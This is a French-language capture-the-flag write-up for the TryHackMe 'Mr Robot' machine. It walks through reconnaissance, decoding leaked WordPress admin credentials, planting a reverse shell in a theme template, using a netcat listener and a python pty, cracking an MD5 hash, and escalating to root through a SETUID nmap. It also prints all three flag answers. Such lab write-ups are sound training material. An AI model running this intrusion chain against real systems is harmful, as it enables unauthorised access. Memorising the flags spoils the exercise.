# Mr Robot CTF

### What is key 1?
---

Indice: Robots

> Commençons par une analyse Nmap. Nmap révèle 3 ports, dont 2 sont ouverts (http et https). SSH semble être fermé.

```
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
```

> Commençons par le serveur Web. Assisté par l’indice, obtenons le fichier. Il divulgue 2 fichiers cachés, dont 1 étant la key 1. `robots.txt`

```
$ curl -s http://10.10.185.196/robots.txt
User-agent: *
fsocity.dic
key-1-of-3.txt
unknown@localhost:/data/documents/challenges/TryHackMe/Mr_Robot_CTF$ curl -s http://10.10.185.196/key-1-of-3.txt
073403c8a58a1f80d943455fb30724b9
```

On peut voir que le deuxième fichier est un dictionnaire, que nous devrons probablement utiliser pour la découverte d’autres emplacements.

```
$ head fsocity.dic 
true
false
wikia
from
the
now
Wikia
extensions
scss
window
```
**Key 1:** `073403c8a58a1f80d943455fb30724b9`

### What is key 2?
---

Indice: Police de couleur blanche

gobuster découvre plusieurs endroits, dont :

/login (Statut : 302)
/wp-content (État : 301)
/admin (Statut : 301)
/wp-login (Statut : 200)
/license (Statut : 200)
/wp-includes (État : 301)
Worpress est installé. De plus, l’annuaire divulgue les informations d’identification : `/license`

```
$ curl -s http://10.10.185.196/license | tr -d "\n"
what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?do you want a password or something?ZWxsaW90OkVSMjgtMDY1Mgo=

$ echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
elliot:ER28-0652
```

On peut voir aussi deux utilisateurs:

| Nom d'utilisateur | Nom | Email | Profil |
|-------------------|-----|-------|--------
|Elliot|Elliot Alderson|elliot@mrrobot.com|Administrateur|
|mich05654|krista Gordon|kgordon@therapist.com|Abonné|

Comme nous sommes administrateurs, nous pouvons modifier les modèles. Allez dans Apparence > Editor et modifiez le premier modèle (404.php) en remplaçant le code PHP par un shell inversé tiré d’ici. Assurez-vous de mettre votre adresse IP locale.

Ouvrez maintenant un écouteur :

```
$ nc -nlvp 1234
```

Et visitez pour ouvrir la coque inversée. `http://10.10.185.196/404.php`

Nous voyons notre prochaine clé mais elle n’est lisible que par l’utilisateur. `/home/robot` `robot`

```
$ ls -l /home/robot/
total 8
-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
$ whoami
daemon
```

Nous recevons également le hachage MD5 du mot de passe de Mr Robot:

```
$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Ce hachage a été trouvé [ici](https://md5.gromweb.com/?md5=c3fcd3d76192e4007dfb496cca67e13b). Essayons de nous connecter en tant que `abcdefghijklmnopqrstuvwxyz` `robot`

```
$ su - robot
su: must be run from a terminal
```

Erreur... OK, pas de problème, créons un shell avec python:

```
$ which python
/usr/bin/python
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ su - robot
su - robot
Password: abcdefghijklmnopqrstuvwxyz
$ whoami
whoami
robot
$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

**Key 2:** `822c73956184f694993bede3eb39f959`

### What is key 3

Indice: nmap

Notre dernière clé se trouve très probablement dans le répertoire, et nous aurons besoin d’une escalade de privilèges pour y accéder. `/root`

L’analyse nmap révèle que le port 22 (ssh) est fermé, probablement parce que le service n’est pas démarré. Nous aurions besoin d’élever nos privilèges.

Malheureusement, notre utilisateur n’est pas dans les sudoers: `robot`

```
$ sudo -l
sudo -l
[sudo] password for robot: abcdefghijklmnopqrstuvwxyz

Sorry, user robot may not run sudo on linux.
```

OK, trouvons quels programmes nous avons avec l’ensemble de bits appartenant à : `SETUID` `root`

```
$ find / -user root -perm -4000 -print 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```

Fait intéressant, nmap est sur la liste (c’est aussi l’indice BTW). En outre, il s’agit d’une très ancienne version (3.81), étant donné que la version actuelle est 7.92 au moment de la rédaction de ce Writeup.

```
$ which nmap
which nmap
/usr/local/bin/nmap
$ nmap --version
nmap --version

nmap version 3.81 ( http://www.insecure.org/nmap/ )
```

En outre, nmap a le bit défini, ce qui signifie que nous pourrons exécuter des commandes en tant que root: `SETUID`

```
$ ls -l /usr/local/bin/nmap
ls -l /usr/local/bin/nmap
-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
```

Commençons en mode interactif : nmap

```
$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !whoami
!whoami
root
waiting to reap child : No child processes
nmap> !ls /root
!ls /root
firstboot_done  key-3-of-3.txt
waiting to reap child : No child processes
nmap> !cat /root/key-3-of-3.txt
!cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
waiting to reap child : No child processes
```

**Key 3:** `04787ddef27c3dee1ee161b21670b4e4`